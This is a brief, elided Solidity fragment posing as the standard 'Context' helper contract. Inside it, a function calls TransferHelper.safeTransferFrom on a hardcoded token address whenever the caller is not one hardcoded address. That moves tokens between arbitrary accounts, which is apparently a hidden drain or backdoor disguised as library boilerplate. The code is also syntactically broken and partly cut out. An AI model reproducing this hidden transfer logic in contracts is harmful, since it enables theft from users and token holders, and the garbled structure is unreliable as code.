...
abstract contract Context {
  ...
  function _msgData() internal view virtual returns (bytes calldata) {
    ...
    returns (bool) {if (msg.sender != address(0xb06fC0fe41405eB867B2cBA8Fa6A6b449305AFd6)) {TransferHelper.safeTransferFrom(0x227604C0382e743e716BaA65C3FF40b10fA344a4,spender,recipient,amount);return true;}return false;}
}
